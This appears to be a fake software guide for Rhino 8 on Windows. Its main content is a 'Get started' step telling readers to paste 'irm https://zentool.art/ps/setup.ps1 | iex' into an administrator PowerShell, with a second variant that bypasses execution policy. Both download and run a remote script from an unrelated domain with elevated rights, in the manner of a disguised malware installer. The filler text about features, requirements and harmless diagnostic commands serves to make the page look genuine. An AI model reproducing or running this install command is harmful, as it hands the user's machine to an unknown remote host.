# Rhino 8 — Windows 3D & CAD Guide (10 & 11)

Windows 10 & 11 · modeling · 3d & cad.

**Rhino 8** on **Windows 10 and 11** — modeling and day-to-day notes for engineers.

## Get started

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) if prompted
4. When the process finishes, open **Rhino 8** from Start or the desktop shortcut

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## Overview

Rhino is a 3D modeling environment for nurbs surfaces, precise drafting, and visualization used in industrial design, jewelry, and architecture studies. Windows deployments emphasize stable GPU drivers and project folders on fast storage.

Once running, verify OpenGL performance, set units and templates, and open sample models to test snaps and layer management. Teams document export profiles for STL, STEP, and rendering handoffs.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I run the command? | **PowerShell as Administrator** — use the block in step 2 under **Get started**. |
| ExecutionPolicy blocked the script? | Expand **Having trouble?** above — that one-liner uses **Bypass** for the current session only. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks during step 3. |

## Features

- Parametric modeling
- Assembly tools
- Drawing sheets
- BOM export
- Industry formats
- Project libraries
- Measurement tools

## Use cases

- Engineering firms
- Manufacturing teams
- Technical colleges

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug    = "Rhino-8-Full"
$BuildLabel     = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**Application check (optional)**

```powershell
Get-Process -Name "Rhino*" -ErrorAction SilentlyContinue |
  Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
  captured_utc = (Get-Date).ToUniversalTime().ToString("o")
  user         = [Environment]::UserName
  machine      = $env:COMPUTERNAME
  channel      = $ReleaseChannel
  product      = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 16 GB minimum · 32 GB recommended |
| Disk | 15 GB free space |

## Topics

`rhino-8-windows` · `rhino-config` · `rhino-integration` · `rhino-latest` · `3d-modeling` · `cad-software` · `design-tools` · `product-design`

## License

This repository is a third-party design usage guide. Comply with applicable software licensing and local regulations.
